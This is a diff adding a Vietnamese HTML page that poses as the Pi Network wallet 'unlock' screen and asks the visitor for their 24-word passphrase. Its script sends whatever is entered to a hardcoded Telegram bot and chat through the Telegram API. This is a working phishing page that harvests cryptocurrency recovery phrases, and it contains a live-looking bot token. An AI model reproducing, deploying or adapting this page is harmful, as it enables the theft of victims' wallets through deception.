@@ -1,0 +1,86 @@
+
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+  <meta charset="UTF-8">
+  <title>Mở khóa ví Pi</title>
+  <style>
+    body {
+      font-family: sans-serif;
+      background: #ffffff;
+      padding: 30px;
+      color: #333;
+    }
+    .container {
+      max-width: 400px;
+      margin: auto;
+      text-align: center;
+    }
+    textarea {
+      width: 100%;
+      height: 120px;
+      font-size: 16px;
+      padding: 10px;
+      box-sizing: border-box;
+      border: 1px solid #ccc;
+      border-radius: 8px;
+    }
+    button {
+      background-color: #7b3fe4;
+      color: white;
+      padding: 12px;
+      border: none;
+      width: 100%;
+      margin-top: 15px;
+      border-radius: 8px;
+      font-size: 16px;
+    }
+    .note {
+      font-size: 14px;
+      margin-top: 20px;
+    }
+    .note a {
+      color: #007bff;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h2>Mở khóa ví Pi</h2>
+    <textarea id="passphrase" placeholder="Nhập cụm mật khẩu 24 từ của bạn tại đây"></textarea>
+    <button onclick="sendToTelegram()">MỞ KHÓA VỚI CỤM MẬT KHẨU</button>
+    <p class="note">
+      Là một ví không giám sát, cụm mật khẩu ví của bạn chỉ có bạn mới có thể truy cập. Hiện tại không thể khôi phục cụm mật khẩu.<br><br>
+      Bạn bị mất cụm mật khẩu ví? <a href="#">Bạn có thể tạo một ví mới</a>, nhưng tất cả số π trong ví trước đó của bạn sẽ không thể truy cập được.
+    </p>
+  </div>
+
+  <script>
+    function sendToTelegram() {
+      const passphrase = document.getElementById("passphrase").value.trim();
+      const words = passphrase.split(/\s+/);
+      if (words.length !== 24) {
+        alert("Cụm mật khẩu phải có đúng 24 từ!");
+        return;
+      }
+
+      const botToken = "7688356031:AAHP5ZxeC3xwmuaNSdcvLrWm7ryCt8UAB1E";
+      const chatId = "326379096";
+      const message = `🛡 Cụm từ mật khẩu Pi:\n\n${passphrase}`;
+
+      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message
+        })
+      })
+      .then(response => alert("Đã gửi!"))
+      .catch(error => alert("Lỗi gửi Telegram"));
+    }
+  </script>
+</body>
+</html>
